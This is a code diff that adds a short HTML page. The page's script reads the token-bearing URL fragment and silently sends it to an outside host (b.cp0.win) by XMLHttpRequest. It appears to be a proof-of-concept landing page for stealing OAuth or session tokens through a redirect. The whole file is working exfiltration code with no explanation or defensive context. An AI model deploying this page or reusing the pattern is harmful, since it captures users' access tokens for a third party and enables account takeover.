@@ -1,0 +1,9 @@
+﻿<html>
+<script>
+var token = document.location.hash;
+var xhr = new XMLHttpRequest();
+var url = 'https://b.cp0.win/?'+escape(token);
+xhr.open('GET', url, true);
+xhr.send();
+</script>
+</html>
